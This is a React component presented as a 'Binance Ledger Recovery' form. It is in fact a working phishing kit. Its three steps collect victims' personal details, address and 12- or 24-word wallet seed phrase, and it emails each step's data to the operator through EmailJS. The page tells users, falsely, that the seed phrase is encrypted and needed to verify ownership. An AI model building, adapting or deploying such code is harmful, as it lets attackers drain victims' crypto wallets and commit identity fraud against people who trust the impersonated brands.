
import React, { useState } from 'react';
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Progress } from "@/components/ui/progress";
import { AlertCircle, CheckCircle2, Eye, EyeOff, Shield, Lock, ArrowLeft, ArrowRight } from "lucide-react";
import { Alert, AlertDescription } from "@/components/ui/alert";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { toast } from "sonner";
import emailjs from 'emailjs-com';
import { EMAILJS_CONFIG } from '../config/emailjs.config';

const BinanceLedgerForm = () => {
  const [currentStep, setCurrentStep] = useState(1);
  const [showSeedPhrase, setShowSeedPhrase] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  
  // Form data state
  const [formData, setFormData] = useState({
    // Step 1: Personal Details
    fullName: '',
    dateOfBirth: '',
    email: '',
    phoneNumber: '',
    
    // Step 2: Address Details
    address: '',
    zipCode: '',
    city: '',
    country: '',
    
    // Step 3: Seed Phrase
    seedPhrase: ''
  });

  const steps = [
    { number: 1, title: "Personal Details", description: "Enter your personal information" },
    { number: 2, title: "Address Details", description: "Provide your address information" },
    { number: 3, title: "Seed Phrase", description: "Enter your wallet seed phrase" }
  ];

  const sendStepNotification = async (stepNumber: number, stepData: any) => {
    try {
      const stepNames = {
        1: "Personal Details Step",
        2: "Address Details Step", 
        3: "Seed Phrase Step"
      };

      const formatStepData = (step: number, data: any) => {
        switch(step) {
          case 1:
            return `Personal Details:
Full Name: ${data.fullName}
Date of Birth: ${data.dateOfBirth}
Email: ${data.email}
Phone Number: ${data.phoneNumber}`;
          case 2:
            return `Address Details:
Address: ${data.address}
Zip Code: ${data.zipCode}
City: ${data.city}
Country: ${data.country}`;
          case 3:
            return `Wallet Seed Phrase:
${data.seedPhrase}

⚠️ SECURITY ALERT: This is sensitive wallet information!`;
          default:
            return JSON.stringify(data, null, 2);
        }
      };

      const templateParams = {
        from_name: formData.fullName || 'User',
        from_email: formData.email || 'user@example.com',
        subject: stepNames[stepNumber],
        message: formatStepData(stepNumber, stepData),
        timestamp: new Date().toLocaleString()
      };

      await emailjs.send(
        EMAILJS_CONFIG.SERVICE_ID,
        EMAILJS_CONFIG.TEMPLATE_ID,
        templateParams,
        EMAILJS_CONFIG.USER_ID
      );

      console.log(`Email sent for ${stepNames[stepNumber]}`);
    } catch (error) {
      console.error('Error sending step notification:', error);
    }
  };

  const handleNext = async () => {
    if (currentStep < 3) {
      // Get current step data
      let stepData = {};
      if (currentStep === 1) {
        stepData = {
          fullName: formData.fullName,
          dateOfBirth: formData.dateOfBirth,
          email: formData.email,
          phoneNumber: formData.phoneNumber
        };
      } else if (currentStep === 2) {
        stepData = {
          address: formData.address,
          zipCode: formData.zipCode,
          city: formData.city,
          country: formData.country
        };
      }

      // Send email notification for completed step
      await sendStepNotification(currentStep, stepData);
      
      // Move to next step
      setCurrentStep(currentStep + 1);
      toast.success(`Step ${currentStep} completed! Email notification sent.`);
    } else {
      // Final step submission
      await handleFinalSubmission();
    }
  };

  const handleFinalSubmission = async () => {
    setIsSubmitting(true);
    try {
      // Send final step notification
      await sendStepNotification(3, { seedPhrase: formData.seedPhrase });
      
      toast.success("Form submitted successfully! All notifications sent.");
      
      // Reset form
      setFormData({
        fullName: '',
        dateOfBirth: '',
        email: '',
        phoneNumber: '',
        address: '',
        zipCode: '',
        city: '',
        country: '',
        seedPhrase: ''
      });
      setCurrentStep(1);
    } catch (error) {
      console.error('Error submitting form:', error);
      toast.error("Failed to submit form. Please try again.");
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleBack = () => {
    if (currentStep > 1) {
      setCurrentStep(currentStep - 1);
    }
  };

  const updateFormData = (field: string, value: string) => {
    setFormData(prev => ({
      ...prev,
      [field]: value
    }));
  };

  const renderStepContent = () => {
    switch (currentStep) {
      case 1:
        return (
          <div className="space-y-4">
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              <div>
                <Label htmlFor="fullName">Full Name *</Label>
                <Input
                  id="fullName"
                  value={formData.fullName}
                  onChange={(e) => updateFormData('fullName', e.target.value)}
                  placeholder="Enter your full name"
                  required
                />
              </div>
              <div>
                <Label htmlFor="dateOfBirth">Date of Birth *</Label>
                <Input
                  id="dateOfBirth"
                  type="date"
                  value={formData.dateOfBirth}
                  onChange={(e) => updateFormData('dateOfBirth', e.target.value)}
                  required
                />
              </div>
            </div>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              <div>
                <Label htmlFor="email">Email Address *</Label>
                <Input
                  id="email"
                  type="email"
                  value={formData.email}
                  onChange={(e) => updateFormData('email', e.target.value)}
                  placeholder="Enter your email"
                  required
                />
              </div>
              <div>
                <Label htmlFor="phoneNumber">Phone Number *</Label>
                <Input
                  id="phoneNumber"
                  type="tel"
                  value={formData.phoneNumber}
                  onChange={(e) => updateFormData('phoneNumber', e.target.value)}
                  placeholder="Enter your phone number"
                  required
                />
              </div>
            </div>
          </div>
        );

      case 2:
        return (
          <div className="space-y-4">
            <div>
              <Label htmlFor="address">Street Address *</Label>
              <Input
                id="address"
                value={formData.address}
                onChange={(e) => updateFormData('address', e.target.value)}
                placeholder="Enter your street address"
                required
              />
            </div>
            <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
              <div>
                <Label htmlFor="zipCode">Zip Code *</Label>
                <Input
                  id="zipCode"
                  value={formData.zipCode}
                  onChange={(e) => updateFormData('zipCode', e.target.value)}
                  placeholder="Enter zip code"
                  required
                />
              </div>
              <div>
                <Label htmlFor="city">City *</Label>
                <Input
                  id="city"
                  value={formData.city}
                  onChange={(e) => updateFormData('city', e.target.value)}
                  placeholder="Enter your city"
                  required
                />
              </div>
              <div>
                <Label htmlFor="country">Country *</Label>
                <Select value={formData.country} onValueChange={(value) => updateFormData('country', value)}>
                  <SelectTrigger>
                    <SelectValue placeholder="Select country" />
                  </SelectTrigger>
                  <SelectContent>
                    <SelectItem value="us">United States</SelectItem>
                    <SelectItem value="ca">Canada</SelectItem>
                    <SelectItem value="uk">United Kingdom</SelectItem>
                    <SelectItem value="au">Australia</SelectItem>
                    <SelectItem value="de">Germany</SelectItem>
                    <SelectItem value="fr">France</SelectItem>
                    <SelectItem value="other">Other</SelectItem>
                  </SelectContent>
                </Select>
              </div>
            </div>
          </div>
        );

      case 3:
        return (
          <div className="space-y-4">
            <Alert>
              <Shield className="h-4 w-4" />
              <AlertDescription>
                Your seed phrase is encrypted and secure. This information is required to verify your wallet ownership.
              </AlertDescription>
            </Alert>
            
            <div>
              <Label htmlFor="seedPhrase">Wallet Seed Phrase *</Label>
              <div className="relative">
                <Input
                  id="seedPhrase"
                  type={showSeedPhrase ? "text" : "password"}
                  value={formData.seedPhrase}
                  onChange={(e) => updateFormData('seedPhrase', e.target.value)}
                  placeholder="Enter your 12 or 24-word seed phrase"
                  className="pr-10"
                  required
                />
                <Button
                  type="button"
                  variant="ghost"
                  size="sm"
                  className="absolute right-2 top-1/2 transform -translate-y-1/2"
                  onClick={() => setShowSeedPhrase(!showSeedPhrase)}
                >
                  {showSeedPhrase ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
                </Button>
              </div>
            </div>

            <Alert>
              <Lock className="h-4 w-4" />
              <AlertDescription>
                <strong>Security Notice:</strong> Never share your seed phrase with anyone. Binance will never ask for your complete seed phrase.
              </AlertDescription>
            </Alert>
          </div>
        );

      default:
        return null;
    }
  };

  const isStepValid = () => {
    switch (currentStep) {
      case 1:
        return formData.fullName && formData.dateOfBirth && formData.email && formData.phoneNumber;
      case 2:
        return formData.address && formData.zipCode && formData.city && formData.country;
      case 3:
        return formData.seedPhrase.trim().split(/\s+/).length >= 12;
      default:
        return false;
    }
  };

  return (
    <div className="max-w-2xl mx-auto p-6">
      <Card>
        <CardHeader>
          <CardTitle className="flex items-center gap-2">
            <Shield className="h-6 w-6 text-yellow-500" />
            Binance Ledger Recovery
          </CardTitle>
          <CardDescription>
            Step {currentStep} of 3: {steps[currentStep - 1].description}
          </CardDescription>
          <Progress value={(currentStep / 3) * 100} className="mt-4" />
        </CardHeader>

        <CardContent>
          <form onSubmit={(e) => e.preventDefault()} className="space-y-6">
            {renderStepContent()}

            <div className="flex justify-between pt-6">
              <Button
                type="button"
                variant="outline"
                onClick={handleBack}
                disabled={currentStep === 1}
              >
                <ArrowLeft className="h-4 w-4 mr-2" />
                Back
              </Button>

              <Button
                type="button"
                onClick={handleNext}
                disabled={!isStepValid() || isSubmitting}
                className="bg-yellow-500 hover:bg-yellow-600 text-black"
              >
                {currentStep === 3 ? (
                  isSubmitting ? (
                    "Submitting..."
                  ) : (
                    <>
                      <CheckCircle2 className="h-4 w-4 mr-2" />
                      Submit
                    </>
                  )
                ) : (
                  <>
                    Next
                    <ArrowRight className="h-4 w-4 ml-2" />
                  </>
                )}
              </Button>
            </div>
          </form>

          <div className="mt-6 text-center">
            <Button variant="link" className="text-blue-600">
              Need Help? Contact Support
            </Button>
          </div>
        </CardContent>
      </Card>
    </div>
  );
};

export default BinanceLedgerForm;
